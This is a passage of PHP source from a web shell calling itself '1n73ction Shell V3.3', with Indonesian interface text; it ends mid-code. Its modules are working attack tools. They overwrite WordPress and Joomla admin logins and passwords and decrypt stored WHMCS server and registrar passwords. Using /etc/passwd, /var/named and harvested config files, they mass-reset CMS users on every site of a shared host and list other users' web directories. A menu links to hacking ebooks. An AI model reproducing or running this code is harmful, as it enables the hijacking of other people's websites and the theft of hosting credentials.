	<input class='inputzbut' type='submit' name='wp-reset' value="Wordpress ResPass" /></td></tr></table>
	</center></form><br><hr><br><br>
 <?php

#======================[ Resspass ]======================# 
	
	if(isset($_POST['wp-reset']))
{

echo "<center/><br/><b><font color=#00ff00>+--==[  Wordpress Reset Password  ]==--+</font></b>";
  
  if(empty($_POST['pwd'])){
  
echo "<FORM method='POST'>
<table class='tabnet' style='width:300px;'> <tr><th colspan='2'>Connect to mySQL server</th></tr> <tr><td>&nbsp;&nbsp;Hostname</td><td>
<input style='width:220px;' class='inputz' type='text' name='localhost' value='localhost' /></td></tr> <tr><td>&nbsp;&nbsp;Database</td><td>
<input style='width:220px;' class='inputz' type='text' name='database' value='wp-' /></td></tr> <tr><td>&nbsp;&nbsp;username</td><td>
<input style='width:220px;' class='inputz' type='text' name='username' value='wp-' /></td></tr> <tr><td>&nbsp;&nbsp;password</td><td>
<input style='width:220px;' class='inputz' type='text' name='password' value='**' /></td></tr>
<tr><td>&nbsp;&nbsp;User baru</td><td>
<input style='width:220px;' class='inputz' type='text' name='admin' value='admin' /></td></tr>
 <tr><td>&nbsp;&nbsp;Pass Baru</td><td>
<input style='width:80px;' class='inputz' type='text' name='pwd' value='123456' />&nbsp;

<input style='width:19%;' class='inputzbut' type='submit' value='change!' name='send' /></FORM>
</td></tr> </table><br><br><br><br>
";
}else{
$localhost = $_POST['localhost'];
$database  = $_POST['database'];
$username  = $_POST['username'];
$password  = $_POST['password'];
$pwd   = $_POST['pwd'];
$admin = $_POST['admin'];


 @mysql_connect($localhost,$username,$password) or die(mysql_error());
 @mysql_select_db($database) or die(mysql_error());

$hash = crypt($pwd);
$a4s=@mysql_query("UPDATE wp_users SET user_login ='".$admin."' WHERE ID = 1") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_pass ='".$hash."' WHERE ID = 1") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_login ='".$admin."' WHERE ID = 2") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_pass ='".$hash."' WHERE ID = 2") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_login ='".$admin."' WHERE ID = 3") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_pass ='".$hash."' WHERE ID = 3") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_email ='".$SQL."' WHERE ID = 1") or die(mysql_error());


if($a4s){
echo "<b> Success ..!! :)) sekarang bisa login ke wp-admin</b> ";
}

}
  
  
  echo "
   </div>";
}

#======================[ Resspass ]======================# 

if(isset($_POST['jm-reset']))
{
echo "<center/><br/><b><font color=#00ff00>+--==[  Joomla Reset Password ]==--+</font></b>";
	if(empty($_POST['pwd'])){
echo "<FORM method='POST'><table class='tabnet' style='width:300px;'> <tr><th colspan='2'>Connect to mySQL </th></tr> <tr><td>&nbsp;&nbsp;Host</td><td>
<input style='width:270px;' class='inputz' type='text' name='localhost' value='localhost' /></td></tr> <tr><td>&nbsp;&nbsp;Database</td><td>
<input style='width:270px;' class='inputz' type='text' name='database' value='database' /></td></tr> <tr><td>&nbsp;&nbsp;username</td><td>
<input style='width:270px;' class='inputz' type='text' name='username' value='db_user' /></td></tr> <tr><td>&nbsp;&nbsp;password</td><td>
<input style='width:270px;' class='inputz' type='password' name='password' value='**' /></td></tr>
<tr><td>&nbsp;&nbsp;User baru</td><td>
<input style='width:270px;' class='inputz' name='admin' value='admin' /></td></tr>
 <tr><td>&nbsp;&nbsp;pass baru </td><td>123456 = 
<input style='width:130px;' class='inputz' name='pwd' value='e10adc3949ba59abbe56e057f20f883e' />&nbsp;

<input style='width:23%;' class='inputzbut' type='submit' value='change!' name='send' /></FORM>
</td></tr> </table><br><br><br><br>
";
}else{
$localhost = $_POST['localhost'];
$database  = $_POST['database'];
$username  = $_POST['username'];
$password  = $_POST['password'];
$pwd   = $_POST['pwd'];
$admin = $_POST['admin'];
@mysql_connect($localhost,$username,$password) or die(mysql_error());
@mysql_select_db($database) or die(mysql_error());
$hash = crypt($pwd);
$SQL=@mysql_query("UPDATE jos_users SET username ='".$admin."' WHERE ID = 62") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET password ='".$pwd."' WHERE ID = 62") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET username ='".$admin."' WHERE ID = 63") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET password ='".$pwd."' WHERE ID = 63") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET username ='".$admin."' WHERE ID = 64") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET password ='".$pwd."' WHERE ID = 64") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET username ='".$admin."' WHERE ID = 65") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET password ='".$pwd."' WHERE ID = 65") or die(mysql_error());
if($SQL){
echo "<b>Success : skarang password barunya >>> - (123456)";
}
}
	
  echo "
   </div>"; 
}


#======================[ Resspass ]======================# 
	
	
	if(isset($_POST['whmcs']))
{
function decrypt ($string,$cc_encryption_hash)
{
    $key = md5 (md5 ($cc_encryption_hash)) . md5 ($cc_encryption_hash);
    $hash_key = _hash ($key);
    $hash_length = strlen ($hash_key);
    $string = base64_decode ($string);
    $tmp_iv = substr ($string, 0, $hash_length);
    $string = substr ($string, $hash_length, strlen ($string) - $hash_length);
    $iv = $out = '';
    $c = 0;
    while ($c < $hash_length)
    {
        $iv .= chr (ord ($tmp_iv[$c]) ^ ord ($hash_key[$c]));
        ++$c;
    }
    $key = $iv;
    $c = 0;
    while ($c < strlen ($string))
    {
        if (($c != 0 AND $c % $hash_length == 0))
        {
            $key = _hash ($key . substr ($out, $c - $hash_length, $hash_length));
        }
        $out .= chr (ord ($key[$c % $hash_length]) ^ ord ($string[$c]));
        ++$c;
    }
    return $out;
}

function _hash ($string)
{
    if (function_exists ('sha1'))
    {
        $hash = sha1 ($string);
    }
    else
    {
        $hash = md5 ($string);
    }
    $out = '';
    $c = 0;
    while ($c < strlen ($hash))
    {
        $out .= chr (hexdec ($hash[$c] . $hash[$c + 1]));
        $c += 2;
    }
    return $out;
}

echo "
<br><center><font size='5' color='#00ff00'><b>-=[ WHMCS Decoder ]=-</b></font></center>
<center>
<br>

<FORM action=''  method='post'>
<input type='hidden' name='form_action' value='2'>
<br>
<table class=tabnet style=width:320px;padding:0 1px;>
<tr><th colspan=2>WHMCS Decoder</th></tr> 
<tr><td>db_host </td><td><input type='text' style='color:#00ff00;background-color:' class='inputz' size='38' name='db_host' value='localhost'></td></tr>
<tr><td>db_username </td><td><input type='text' style='color:#00ff00;background-color:' class='inputz' size='38' name='db_username' value=''></td></tr>
<tr><td>db_password</td><td><input type='text' style='color:#00ff00;background-color:' class='inputz' size='38' name='db_password' value=''></td></tr>
<tr><td>db_name</td><td><input type='text' style='color:#00ff00;background-color:' class='inputz' size='38' name='db_name' value=''></td></tr>
<tr><td>cc_encryption_hash</td><td><input style='color:#00ff00;background-color:' type='text' class='inputz' size='38' name='cc_encryption_hash' value=''></td></tr>
<td>&nbsp;&nbsp;&nbsp;&nbsp;<INPUT class='inputzbut' type='submit' style='color:#00ff00;background-color:'  value='Submit' name='Submit'></td>
</table>
</FORM>
</center>
";

 if($_POST['form_action'] == 2 )
 {
 //include($file);
 $db_host=($_POST['db_host']);
 $db_username=($_POST['db_username']);
 $db_password=($_POST['db_password']);
 $db_name=($_POST['db_name']);
 $cc_encryption_hash=($_POST['cc_encryption_hash']);



    $link=mysql_connect($db_host,$db_username,$db_password) ;
        mysql_select_db($db_name,$link) ;
$query = mysql_query("SELECT * FROM tblservers");
while($v = mysql_fetch_array($query)) {
$ipaddress = $v['ipaddress'];
$username = $v['username'];
$type = $v['type'];
$active = $v['active'];
$hostname = $v['hostname'];
echo("<center><table border='1'>");
$password = decrypt ($v['password'], $cc_encryption_hash);
echo("<tr><td>Type</td><td>$type</td></tr>");
echo("<tr><td>Active</td><td>$active</td></tr>");
echo("<tr><td>Hostname</td><td>$hostname</td></tr>");
echo("<tr><td>Ip</td><td>$ipaddress</td></tr>");
echo("<tr><td>Username</td><td>$username</td></tr>");
echo("<tr><td>Password</td><td>$password</td></tr>");

echo "</table><br><br></center>";
}

    $link=mysql_connect($db_host,$db_username,$db_password) ;
        mysql_select_db($db_name,$link) ;
$query = mysql_query("SELECT * FROM tblregistrars");
echo("<center>Domain Reseller <br><table class=tabnet border='1'>");
echo("<tr><td>Registrar</td><td>Setting</td><td>Value</td></tr>");
while($v = mysql_fetch_array($query)) {
$registrar     = $v['registrar'];
$setting = $v['setting'];
$value = decrypt ($v['value'], $cc_encryption_hash);
if ($value=="") {
$value=0;
}
$password = decrypt ($v['password'], $cc_encryption_hash);
echo("<tr><td>$registrar</td><td>$setting</td><td>$value</td></tr>");
}
}
}

#======================[ Resspass ]======================#

if(isset($_POST['respass']))
{
echo <<<PEE
<br><center><b><font size=4>+--=[ Mass Password ]=--+</font></b></center><br><br>
<form method='POST'>
<center><table class='tabnet'>
<th>Mass Password</th>
<tr><tr><td><b>USER :</b> <input size='20' value='admin' class='inputz' name='user' type='text'></td></tr>
<tr><td><b>PASS :</b> <input size='20' value='inject' name='pass' class='inputz' type='text'></td></tr>
<tr><td>
<input class='inputzbut'value='Change' name='marKoplak' type='submit'></td></tr></tr>
</table></form>

PEE;
$submit = $_POST['marKoplak'];
if(isset($submit)){
################### USER & PASS ################
$user = $_POST['user'];
$pass = $_POST['pass'];
################################################


if(is_readable("/var/named"))
{
	
	echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4">';
	echo '<tr><td><b>DOMAIN</b></td><td>USER</td><td>CMS</td><td>STATUS</b></td>';
	$list = scandir("/var/named");
	foreach($list as $domain){
	if(strpos($domain,".db"))
	{
		$domain = str_replace('.db','',$domain);
		$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
		$url = 'http://'.$domain;
		if(chk_header($pageURL.'pee/'.$owner['name'].'-WordPress.txt'))
		{ 
			$config = $pageURL.'pee/'.$owner['name'].'-WordPress.txt';
			
			file_get_contents($pageURL.'pee/'.$owner['name'].'-WordPress.txt');
			##GET DATABASE INFO FROM CONFIGURATION FILE
			$cnf = file_get_contents($pageURL.'pee/'.$owner['name'].'-WordPress.txt');
			$hostname = Find($cnf,"define('DB_HOST', '","');");
			$username = Find($cnf,"define('DB_USER', '","');");
			$password = Find($cnf,"define('DB_PASSWORD', '","');");
			$dbname = Find($cnf,"define('DB_NAME', '","');");
			$prefix = Find($cnf,"table_prefix  = '","'");
			
			$link=mysql_connect($hostname,$username,$password);
			
			if ($link) 
			{
				$hash = crypt($pass);
				mysql_select_db($dbname,$link) ;
				$tab = $prefix.'users';			
				$query2   = @mysql_query("UPDATE `$tab`  SET `user_login` ='$user'");
 				$query3  = @mysql_query("UPDATE `$tab`  SET `user_pass` ='$hash'");
				$req =@mysql_query("SELECT * from  `".$prefix."options` WHERE option_name='home'");
				$data = mysql_fetch_array($req);
				$site_url=$data["option_value"];
				
				error_reporting(0);
				echo '<tr><td><a href='.$url.' onclick="window.open(this.href);return 

false;">'.$domain.'</a></td><td>'.$owner['name'].'</td><td><a href='.$config.'>WordPress</a></td><td><font 

color="green">success..</font></td>';
				
			}else{
				echo '<tr><td><a href='.$url.' onclick="window.open(this.href);return 

false;">'.$domain.'</a></td><td>'.$owner['name'].'</td><td><a href='.$config.'>WordPress</a></td><td><font color="red">mysql 

fail</font></td>';
			}
		
			
		
		
		}
		
		
		
		elseif(chk_header($pageURL.'pee/'.$owner['name'].'-Joomla.txt'))
		{ 
		
		##GET DATABASE INFO FROM CONFIGURATION FILE
			$cnf = file_get_contents($pageURL.'pee/'.$owner['name'].'-Joomla.txt');
			$config = $pageURL.'pee/'.$owner['name'].'-Joomla.txt';
			
			if(preg_match('%(JConfig|mosConfig)%',$cnf)){
			
			######
			if(preg_match('%JConfig%', $cnf)){
			$username=Find($cnf,"\$user = '","'");
			$password=Find($cnf,"\$password = '","'");
			$dbname=Find($cnf,"\$db = '","'");
			$prefix=Find($cnf,"\$dbprefix = '","'");
			
			
			$link=mysql_connect("localhost",$username,$password);
			
			if ($link) 
			{
				$hash = md5($user);
				mysql_select_db($dbname,$link) ;
				$tab = $prefix.'users';			
				$query2   = @mysql_query("UPDATE `$tab`  SET `username` ='$user'");
 				$query3  = @mysql_query("UPDATE `$tab`  SET `password` ='$hash'");
				
			echo '<tr><td><a href='.$url.' onclick="window.open(this.href);return 

false;">'.$domain.'</a></td><td>'.$owner['name'].'</td><td><a href='.$config.'>Joomla</a></td><td><font 

color="green">success..</font><br>';

			}else{
				echo '<tr><td><a href='.$url.' onclick="window.open(this.href);return 

false;">'.$domain.'</a></td><td>'.$owner['name'].'</td><td><a href='.$config.'>Joomla</a></td><td><font color="red">mysql 

fail</font></td>';
			}
			
			}
			
			#####
			elseif(preg_match('%mosConfig%',$cnf)){
			$username=Find($cnf,"\$mosConfig_user = '","'");
			$password=Find($cnf,"\$mosConfig_password = '","'");
			$dbname=Find($cnf,"\$mosConfig_db = '","'");
			$prefix=Find($cnf,"\$mosConfig_dbprefix = '","'");
			$pwd = md5($npass);
			
			$link=mysql_connect("localhost",$username,$password);
			
			if ($link) 
			{
				$hash = md5($pass);
				mysql_select_db($dbname,$link) ;
				$tab = $prefix.'users';			
				$query2   = @mysql_query("UPDATE `$tab`  SET `username` ='$user'");
 				$query3  = @mysql_query("UPDATE `$tab`  SET `password` ='$hash'");
				
				echo '<tr><td><a href='.$url.' onclick="window.open(this.href);return 

false;">'.$domain.'</a></td><td>'.$owner['name'].'</td><td><a href='.$config.'>Joomla</a></td><td><font 

color="green">success..</font><br>';

			}else{
				echo '<tr><td><a href='.$url.' onclick="window.open(this.href);return 

false;">'.$domain.'</a></td><td>'.$owner['name'].'</td><td><a href='.$config.'>Joomla</a></td><td><font color="red">mysql 

fail</font></td>';
			}
			
			}
			
			
			}
			#########
			
			
		}
	}
}
}
}
elseif(is_readable("/etc/passwd")){

echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4">';
echo '<tr><td><b>DOMAIN</b></td><td>USER</td><td>CMS</td><td>STATUS</b></td>';
			
foreach($etcz as $etz){
$etcc = explode(":",$etz);


if(chk_header($pageURL.'pee/'.$etcc[0].'-WordPress.txt'))
		{ 
			
			$config = $pageURL.'pee/'.$owner['name'].'-WordPress.txt';
			file_get_contents($pageURL.'pee/'.$etcc[0].'-WordPress.txt');
			##GET DATABASE INFO FROM CONFIGURATION FILE
			$cnf = file_get_contents($pageURL.'pee/'.$etcc[0].'-WordPress.txt');
			$hostname = Find($cnf,"define('DB_HOST', '","');");
			$username = Find($cnf,"define('DB_USER', '","');");
			$password = Find($cnf,"define('DB_PASSWORD', '","');");
			$dbname = Find($cnf,"define('DB_NAME', '","');");
			$prefix = Find($cnf,"table_prefix  = '","'");
			
			$link=mysql_connect($hostname,$username,$password);
			
			if ($link) 
			{
				
				$hash = crypt($user);
				mysql_select_db($dbname,$link) ;
				$req =mysql_query("SELECT * from  `".$prefix."options` WHERE option_name='home'");
				$data = mysql_fetch_array($req);
				$site_url=$data["option_value"];
				$tab = $prefix.'users';			
				$query2   = @mysql_query("UPDATE `$tab`  SET `user_login` ='$user'");
 				$query3  = @mysql_query("UPDATE `$tab`  SET `user_pass` ='$hash'");
				
				error_reporting(0);
				
				echo '<tr><td><a href='.$url.' onclick="window.open(this.href);return 

false;">'.$domain.'</a></td><td>'.$owner['name'].'</td><td><a href='.$config.'>WordPress</a></td><td><font 

color="green">success..</font><br>';

			}else{
				echo '<tr><td><a href='.$url.' onclick="window.open(this.href);return 

false;">'.$domain.'</a></td><td>'.$owner['name'].'</td><td><a href='.$config.'>WordPress</a></td><td><font color="red">mysql 

fail</font></td>';
			}
		
			
		
		
		}
		
		
		
		elseif(chk_header($pageURL.'pee/'.$etcc[0].'-Joomla.txt'))
		{ 
		
		##GET DATABASE INFO FROM CONFIGURATION FILE
			$cnf = file_get_contents($pageURL.'pee/'.$etcc[0].'-Joomla.txt');
			$config = $pageURL.'pee/'.$owner['name'].'-Joomla.txt';
			
			if(preg_match('%(JConfig|mosConfig)%',$cnf)){
			
			######
			if(preg_match('%JConfig%', $cnf)){
			$username=Find($cnf,"\$user = '","'");
			$password=Find($cnf,"\$password = '","'");
			$dbname=Find($cnf,"\$db = '","'");
			$prefix=Find($cnf,"\$dbprefix = '","'");
			$site_url = Find($cnf,"\$mailfrom = '","'");
			$site_url = explode("@",$site_url);
			
			
			
			$link=mysql_connect("localhost",$username,$password);
			
			if ($link) 
			{
				$hash = md5($pass);
				mysql_select_db($dbname,$link) ;
				$tab = $prefix.'users';			
				$query2   = @mysql_query("UPDATE `$tab`  SET `username` ='$user'");
 				$query3  = @mysql_query("UPDATE `$tab`  SET `password` ='$hash'");
			echo '<tr><td><a href='.$url.' onclick="window.open(this.href);return 

false;">'.$domain.'</a></td><td>'.$owner['name'].'</td><td><a href='.$config.'>Joomla</a></td><td><font 

color="green">success..</font><br>';

			}else{
				echo '<tr><td><a href='.$url.' onclick="window.open(this.href);return 

false;">'.$domain.'</a></td><td>'.$owner['name'].'</td><td><a href='.$config.'>Joomla</a></td><td><font color="red">mysql 

fail</font></td>';
			}
			
			}
			
			#####
			elseif(preg_match('%mosConfig%',$cnf)){
			$username=Find($cnf,"\$mosConfig_user = '","'");
			$password=Find($cnf,"\$mosConfig_password = '","'");
			$dbname=Find($cnf,"\$mosConfig_db = '","'");
			$prefix=Find($cnf,"\$mosConfig_dbprefix = '","'");
			$site_url = Find($cnf,"\$mailfrom = '","'");
			$site_url = explode("@",$site_url);
			
			$link=mysql_connect("localhost",$username,$password);
			
			if ($link) 
			{
				$hash = md5($pass);
				mysql_select_db($dbname,$link) ;
				$tab = $prefix.'users';			
				$query2   = @mysql_query("UPDATE `$tab`  SET `username` ='$user'");
 				$query3  = @mysql_query("UPDATE `$tab`  SET `password` ='$hash'");
				
				echo '<tr><td><a href='.$url.' onclick="window.open(this.href);return 

false;">'.$domain.'</a></td><td>'.$owner['name'].'</td><td><a href='.$config.'>Joomla</a></td><td><font 

color="green">success..</font><br>';

			}else{
				echo '<tr><td><a href='.$url.' onclick="window.open(this.href);return 

false;">'.$domain.'</a></td><td>'.$owner['name'].'</td><td><a href='.$config.'>Joomla</a></td><td><font color="red">mysql 

fail</font></td>';
			}
			
			}
			
			
			}
			#########
			
			
		}
	}
}
}
}

///////////////////////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'jumping')){ @ini_set('output_buffering',0); 
?>
    <form action="?y=<?php echo $pwd; ?>&x=jumping" method="post">
	<br><br><center><b><font size=4>+--=[ Jumping ]=--+</font></b></center><br><br>
	<?php
	echo "<table class=\"cmdbox\"><tr><td colspan=\"2\">"; 
($sm = ini_get('safe_mode') == 0) ? 
$sm = 'off': die("<b><blink><font style='color:#ff0000'>[-] ERROR</font></blink>&nbsp;: &nbsp;&nbsp;Safe_mode = On </b></td></tr></table>
<br><br><br><br><center><div class=\"info\"><b>[__1n73ction Shell V3.3 Spesial Edition__]</div> 
<br><br><div class=\"jaya\"> &copy; ".date('Y',time())." X'1N73CT </b></div></center>");
 
set_time_limit(0);
echo "<table class=\"cmdbox\"><tr><td colspan=\"2\">";  
@$passwd = fopen('/etc/passwd','r'); 
if (!$passwd) { die ("<b><blink><font style='color:#ff0000'>[-] ERROR</font></blink>&nbsp; : &nbsp;&nbsp; I Can't Read [ /etc/passwd ]</b></td></tr></table>
<br><br><br><br><center><div class=\"info\"><b>[__1n73ction Shell V3.3 Spesial Edition__]</div> 
<br><br><div class=\"jaya\"> &copy; ".date('Y',time())." X'1N73CT </b></div></center>"); }
echo "<table class=tabnet><tr><td>Status</td><td>Directory</td></tr>";
$pub = array(); 
$users = array(); 
$conf = array(); 
$i = 0; 
while(!feof($passwd)){ 
$str = fgets($passwd); 
if ($i > 10000){ $pos = strpos($str,':'); 
$username = substr($str,0,$pos); 
$dirz = '/home/'.$username.'/public_html/'; 
if (($username != '')){ if (is_readable($dirz)){ array_push($users,$username); 
array_push($pub,$dirz); } } } $i++; } 
foreach ($users as $user){ 
echo '<tr><td> &nbsp;&nbsp;[Found !]&nbsp;&nbsp; </td><td> <a href="?y=/home/'.$user.'/public_html">/home/'.$user.'/public_html/</a><td></tr>'; } 
 echo "</table>";
 } 

////////////////////////////////////////////////////////////////////////////

elseif(isset($_GET['x']) && ($_GET['x'] == 'tutor'))
    {@ini_set('output_buffering',0); 
    ?>
	<form action="?y=<?php echo $pwd; ?>&x=tutor" method="post">
	<center><br><br><b>+--=[ Tutorial & Ebook hacking ]=--+</b><br>
		<form method="post" action="">
<table class="tabnet" border="1" >
<tr>
		<td align="center">English</td><td align="center">Indonesian</td>
	</tr>
	<tr>
		<td><form method="post" action="">&nbsp;
	E-book Hacking &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;
	<select class="inputzbut" name="pilih" id="pilih">
	<option value=""selected>-----------------[ Select ]-----------------</option>
	<option value="tutorial24" > Hacking Exposed-5 </option>
	<option value="tutorial25"> Internet Denial Of Service </option>
	<option value="tutorial26">Computer Viruses For Dummies</option>
	<option value="tutorial27">Hack Attacks Testing</option>
	<option value="tutorial28">Secrets Of A Super Hacker</option>
	<option value="tutorial29">Stealing The Network</option>
	<option value="tutorial30">Hacker's HandBook</option>
	</select>
	<input  type="submit" name="submit" class="inputzbut" value="Download">
	</td></form>
<td><form method="post" action="">&nbsp;
Tutorial by X'1N73CT &nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;
	<select class="inputzbut"  name="pilih" id="pilih">
	<option value=""selected>-----------------[ Select ]-----------------</option>
		<option value="tutorial2">Search Engine Hacking</option>
		<option value="tutorial3">SQL Injection dengan hackbar</option>
		<option value="tutorial1" >Bypass Illegalmix Union Select</option>
	</select>
	<input  type="submit" name="submit" class="inputzbut" value="Download">
</form></td>
</tr>
<tr>
<td>
<form method="post" action="">&nbsp;
E-Book from Syn|gress &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;
	<select class="inputzbut"  name="pilih" id="pilih">
	<option value=""selected>-----------------[ Select ]-----------------</option>
	<option value="cryptography_for_defeloper">Cryptography for Developer</option>
	<option value="tutorial31">Mobile Malware Attack and Defense</option>
	<option value="forensic">CD and DVD Forensic</option>
	<option value="ddd">Open Sourch Security Tools</option>
	<option value="metasploit">Metaslpoit Toolkit</option>
	<option value="stealing_network">Stealing the Network</option>
	<option value="security_polices">Creating Security Polices</option>
	</select>
	<input  type="submit" name="submit" class="inputzbut" value="Download">
</form></td>
<td>
<form method="post" action="">&nbsp;
X-CODE MAGAZINE &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;
	<select class="inputzbut" name="pilih" id="pilih">
	<option value=""selected>-----------------[ Select ]-----------------</option>
	<option value="tutorial4">X-CODE MAGAZINE 1</option>
	<option value="tutorial5">X-CODE MAGAZINE 2</option>
	<option value="tutorial6">X-CODE MAGAZINE 3</option>
	<option value="tutorial7">X-CODE MAGAZINE 4</option>
	<option value="tutorial8">X-CODE MAGAZINE 5</option>
	<option value="tutorial9">X-CODE MAGAZINE 6</option>
	<option value="tutorial10">X-CODE MAGAZINE 7</option>
	<option value="tutorial11">X-CODE MAGAZINE 8</option>
	<option value="tutorial12">X-CODE MAGAZINE 9</option>
	<option value="tutorial13">X-CODE MAGAZINE 10</option>
	<option value="tutorial14">X-CODE MAGAZINE 11</option>
	<option value="tutorial15">X-CODE MAGAZINE 12</option>
	<option value="tutorial16">X-CODE MAGAZINE 13</option>
	<option value="tutorial17">X-CODE MAGAZINE 14</option>
	<option value="tutorial18">X-CODE MAGAZINE 15</option>
	<option value="tutorial19">X-CODE MAGAZINE 16</option>
	<option value="tutorial20">X-CODE MAGAZINE 17</option>
	<option value="tutorial21">X-CODE MAGAZINE 18</option>
	<option value="tutorial22">X-CODE MAGAZINE 19</option>
	<option value="tutorial23">X-CODE MAGAZINE 20</option>
	<option value="tutorial024">X-CODE MAGAZINE 21</option>
	</select>
	<input type="submit" name="submit" class="inputzbut" value="Download" ></a>
</form></td></tr></table><br><br>
<?php
$submit = $_POST ['submit'];
if(isset($submit)) {
	$pilih = $_POST['pilih'];
		if ( $pilih == 'tutorial1') {
			?>
			<script>
				document.location = 'http://www.pharmconseil-elearning.com/main/upload/by_passing_illegal_mix_of_collations_for_operation__union__by_x_1n73ct.pdf';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial2') {
			?>
			<script>
				document.location = 'http://www.pharmconseil-elearning.com/main/upload/Search_engine_hacking_by_x_1n73ct.pdf';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial3') {
			?>
			<script>
				document.location = 'http://www.pharmconseil-elearning.com/main/upload/Sql_injection_dengan_hackbar.pdf';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial4') {
			?>
			<script>
				document.location = 'http://xcode.or.id/files/xcode_magazine_1.zip';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial5') {
			?>
			<script>
				document.location = 'http://xcode.or.id/files/xcode_magazine_2.zip';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial6') {
			?>
			<script>
				document.location = 'http://xcode.or.id/files/xcode_magazine_3.zip';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial7') {
			?>
			<script>
				document.location = 'http://xcode.or.id/files/xcode_magazine_4.zip';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial8') {
			?>
			<script>
				document.location = 'http://xcode.or.id/files/xcode_magazine_5.rar';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial9') {
			?>
			<script>
				document.location = 'http://xcode.or.id/files/xcode_magazine_6.rar';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial10') {
			?>
			<script>
				document.location = 'http://xcode.or.id/files/xcode_magazine_7.rar';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial11') {
			?>
			<script>
				document.location = 'http://xcode.or.id/files/xcode_magazine_8.rar';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial12') {
			?>
			<script>
				document.location = 'http://xcode.or.id/files/xcode9.zip';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial13') {
			?>
			<script>
				document.location = 'http://xcode.or.id/files/xcode10.zip';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial14') {
			?>
			<script>
				document.location = 'http://xcode.or.id/files/xcode11.zip';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial15') {
			?>
			<script>
				document.location = 'http://xcode.or.id/files/Xcode12.zip';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial16') {
			?>
			<script>
				document.location = 'http://xcode.or.id/files/Xcode13.zip';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial17') {
			?>
			<script>
				document.location = 'http://xcode.or.id/files/Xcode14.zip';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial18') {
			?>
			<script>
				document.location = 'http://xcode.or.id/Xcode15.zip';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial19') {
			?>
			<script>
				document.location = 'http://xcode.or.id/xcode_magazine_16.zip';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial20') {
			?>
			<script>
				document.location = 'http://xcode.or.id/xcode_magazine_17.zip';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial21') {
			?>
			<script>
				document.location = 'http://xcode.or.id/xcode_magazine_18.zip';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial22') {
			?>
			<script>
				document.location = 'http://xcode.or.id/xcode_magazine_19.zip';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial23') {
			?>
			<script>
				document.location = 'http://xcode.or.id/xcode_magazine_20.zip';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial024') {
			?>
			<script>
				document.location = 'http://xcode.or.id/xcode_magazine_21.zip';
			</script>
			<?php
		}
		
		elseif ( $pilih == 'tutorial24') {
			?>
			<script>
				document.location = 'http://www.insecure.in/ebooks/hacking_exposed_5.rar';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial25') {
			?>
			<script>
				document.location = 'http://www.insecure.in/ebooks/internet_denial_of_service.rar';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial26') {
			?>
			<script>
				document.location = 'http://www.insecure.in/ebooks/computer_viruses_for_dummies.rar';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial27') {
			?>
			<script>
				document.location = 'http://www.insecure.in/ebooks/hack_attacks_testing.rar';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial28') {
			?>
			<script>
				document.location = 'http://www.insecure.in/ebooks/secrets_of_super_hacker.rar';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial29') {
			?>
			<script>
				document.location = 'http://www.insecure.in/ebooks/stealing_network_how_to_own_shadow.rar';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial30') {
			?>
			<script>
				document.location = 'http://www.insecure.in/ebooks/webapp_hackers_handbook.rar';
			</script>
			<?php
		}
		elseif ( $pilih == 'ddd') {
			?>
			<script>
				document.location = 'http://199.91.153.95/t8dni7k639hg/3o321lcwwk8u5bh/Open_Source_Security_Tools.pdf';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial31') {
			?>
			<script>
				document.location = 'http://205.196.121.149/sg22hm8qjbhg/afsa7ibbk4ny2kd/Mobile_Malware_Attacks_and_Defense.pdf';
			</script>
			<?php
		}
		elseif ( $pilih == 'cryptography_for_defeloper') {
			?>
